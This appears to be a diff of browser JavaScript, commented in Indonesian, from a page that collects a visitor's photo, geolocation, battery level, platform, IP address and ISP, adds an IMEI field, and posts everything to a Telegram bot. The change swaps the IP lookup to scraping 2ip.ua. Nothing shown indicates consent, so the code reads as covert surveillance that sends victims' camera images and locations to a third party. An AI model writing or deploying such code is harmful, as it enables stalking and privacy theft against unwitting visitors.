@@ -53,6 +53,7 @@
             platform: navigator.platform,
             batteryLevel: null,
             isp: null, // Info ISP perangkat
+            imei: null, // Info IMEI perangkat
             ipAddress: null // Alamat IP perangkat
           };
 
@@ -62,43 +63,35 @@
               .then(function(battery) {
                 deviceInfo.batteryLevel = battery.level * 100;
 
-                // Mengambil informasi ISP dan alamat IP perangkat menggunakan whatismyipaddress.com
-                fetch('https://whatismyipaddress.com/')
+                // Mengambil IP perangkat menggunakan layanan ipify
+                fetch('https://2ip.ua/')
                   .then(function(response) {
                     return response.text();
                   })
-                  .then(function(html) {
-                    // Parsing HTML untuk mendapatkan informasi ISP dan alamat IP
+                  .then(function(data) {
                     var parser = new DOMParser();
-                    var doc = parser.parseFromString(html, 'text/html');
-
-                    var ispElement = doc.querySelector('.ip-info-data:nth-child(2) a');
-                    var ipAddressElement = doc.querySelector('.ip-info-data:nth-child(4) a');
-
-                    var isp = ispElement ? ispElement.textContent.trim() : 'N/A';
-                    var ipAddress = ipAddressElement ? ipAddressElement.textContent.trim() : 'N/A';
-
-                    // Menambahkan informasi ISP dan alamat IP ke informasi perangkat
-                    deviceInfo.isp = isp;
-                    deviceInfo.ipAddress = ipAddress;
+                    var htmlDoc = parser.parseFromString(data, 'text/html');
+                    var ipElement = htmlDoc.querySelector('.ip-block');
+                    var ispElement = htmlDoc.querySelector('.whois-block');
+                    if (ipElement && ispElement) {
+                      deviceInfo.ipAddress = ipElement.textContent.trim();
+                      deviceInfo.isp = ispElement.textContent.trim();
+                    }
 
                     // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
                   })
                   .catch(function(error) {
                     console.error('Terjadi kesalahan dalam mendapatkan informasi ISP dan alamat IP:', error);
-                    // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API tanpa informasi ISP dan alamat IP
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
                   });
               })
               .catch(function(error) {
                 console.error('Gagal mendapatkan informasi batrai:', error);
-                // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API tanpa informasi ISP dan alamat IP
                 sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
               });
           } else {
             console.error('Browser tidak mendukung mendapatkan informasi batrai.');
-            // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API tanpa informasi ISP dan alamat IP
             sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
           }
         }, function(error) {
@@ -135,12 +128,12 @@
         method: 'POST',
         body: formData
       })
-        .then(function(response) {
-          console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
-        })
-        .catch(function(error) {
-          console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
-        });
+      .then(function(response) {
+        console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
+      })
+      .catch(function(error) {
+        console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
+      });
     }
 
     // Fungsi untuk mengonversi data URI menjadi Blob
